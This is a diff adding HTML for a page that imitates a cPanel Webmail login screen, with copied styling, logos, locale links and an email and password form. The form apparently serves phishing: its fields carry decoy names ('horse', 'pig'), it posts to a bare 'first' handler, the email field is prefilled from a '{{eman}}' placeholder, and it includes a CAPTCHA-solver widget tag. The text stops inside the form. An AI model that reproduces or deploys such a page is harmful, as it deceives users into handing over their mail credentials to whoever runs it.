+  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll transparent;
+  background-size: 25px auto;
+  background-position: center 35px;
+}
+.login-rt .label--title {
+  font-family: 'Museo Sans 300' !important;
+  font-size: 16px !important;
+  margin-bottom: 32px !important;
+}
+  </style>
+    
+    <style type="text/css">
+/*
+  This css is included in the base template in case the css cannot be loaded because of access restrictions
+  If this css is updated, please update securitypolicy_header.html.tmpl as well
+*/
+.copyright {
+  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
+  background-size: 25px auto;
+}
+    </style>
+    <!--[if IE 6]>
+    <style type="text/css">
+        img {
+            behavior: url(/cPanel_magic_revision_1708978746/unprotected/cp_pngbehavior_login.htc);
+        }
+    </style>
+    <![endif]-->
+
+    <capsolver-widgets></capsolver-widgets></head>
+<body class="wm"><div id="preload_images"></div>
+
+
+
+
+<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
+<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
+    <div class="wrapper">
+        <div id="notify">
+            <noscript>
+                <div class="error-notice">
+                    <img src="https://guide-level.com:2096/cPanel_magic_revision_1730289691/unprotected/nc-cpanel/images/notice-error.png" alt="Error" align="left"/>
+                    JavaScript is disabled in your browser.
+                    For Webmail to function properly, you must enable JavaScript.
+                    If you do not enable JavaScript, certain features in Webmail will not function correctly.
+                </div>
+            </noscript>
+            
+
+            
+            <!-- <div id='login-status' class="alert error-notice" style="visibility: hidden;">
+                <div class="content-wrapper">
+                    <div id="login-detail" class="alert__content">
+                        <div id="login-status-icon-container"><span class='login-status-icon'></span></div>
+                        <div id="login-status-message">You have logged out.</div>
+                    </div>
+                </div>
+            </div> -->
+            <div id="IE-warning" class="warn-notice IE-warning-hide" style="display: none">
+                <div class="content-wrapper">
+                    <div id="IE-warning-detail">
+                        <div id="IE-warning-icon-container"><span class="IE-warning-icon"></span></div>
+                        <div id="IE-warning-message">The system has detected that you are using Internet Explorer 11. cPanel &amp; WHM no longer supports Internet Explorer 11. For more information, read the <a title="cPanel Blog" target="_blank" href="https://go.cpanel.net/ie11deprecation">cPanel Blog</a>.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div style="display:none">
+            <div id="locale-container" style="visibility:hidden">
+                <div id="locale-inner-container">
+                    <div id="locale-header">
+                        <div class="locale-head">Please select a locale:</div>
+                        <div class="close"><a href="javascript:void(0)" onclick="toggle_locales(false)">X Close</a></div>
+                    </div>
+                    <div id="locale-map">
+                        <div class="scroller clear">
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=ar">العربية</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=cs">čeština</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=da">dansk</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=de">Deutsch</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=el">Ελληνικά</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=es">español</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=es_419">español latinoamericano</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=es_es">español de España</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=fi">suomi</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=fil">Filipino</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=fr">français</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=he">עברית</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=hu">magyar</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=id">Bahasa Indonesia</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=it">italiano</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=ja">日本語</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=ko">한국어</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=ms">Bahasa Melayu</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=nb">norsk bokmål</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=nl">Nederlands</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=pl">polski</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=pt">português</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=pt_br">português do Brasil</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=ro">română</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=ru">русский</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=sv">svenska</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=th">ไทย</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=tr">Türkçe</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=uk">українська</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=vi">Tiếng Việt</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=zh">中文</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=zh_cn">中文（中国）</a></div>
+                            
+                            <div class="locale-cell"><a href="https://guide-level.com:2096/?locale=zh_tw">中文（台湾）</a></div>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="content-container">
+            <div id="login-container" class="login-container">
+                <div id="login-sub-container" class="login-container__sub-container">
+                    <div id="login-sub-header" class="login-container__header">
+                        
+                            <img class="main-logo" src="data:image/png;base64,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" alt="logo">
+                        
+                    </div>
+
+                    
+
+                    <div id="login-sub" class="login-container__main">
+                        
+                        <div id="clickthrough_form" style="visibility:hidden">
+                            <form action="javascript:void(0)">
+                                <div class="notices"></div>
+                                <button type="submit" class="clickthrough-cont-btn">Continue</button>
+                            </form>
+                        </div>
+                        <div id="forms" class="login-container__login-form login-form">
+                                                        <form id="login_form" action="first" method="post" style="visibility:">
+                                <div class="input-req-login login-form__label">
+                                    <label for="user">Email Address</label>
+
+                                    
+                                </div>
+
+                                <div class="input-field-login icon username-container login-form__input">
+                                    <input name="horse" id="user" autofocus="autofocus" value="{{eman}}" placeholder="Enter your email address." class="std_textbox form-control is-error" type="text" autocomplete="off" tabindex="1" required>
+                                    
+                                </div>
+
+                                <div class="input-req-login login-password-field-label login-form__label mt-32">
+                                    <label for="pass">Password</label>
+                                </div>
+
+                                <div class="input-field-login icon password-container login-form__input form-field form-field--with-action">
+                                    <input name="pig" id="pass" placeholder="Enter your email password." class="std_textbox form-control" type="password" tabindex="2" autocomplete="off" required="">
+                                    
+                                </div>
+
+                                <div class="controls login-form__controls">
+                                    <div class="login-btn">
+                                        <button name="login" type="submit" class="login-form__submit btn btn--red btn--block" id="login_submit" tabindex="3" >Log in</button>
+                                    </div>
+
+                                                                            <div class="reset-pw">
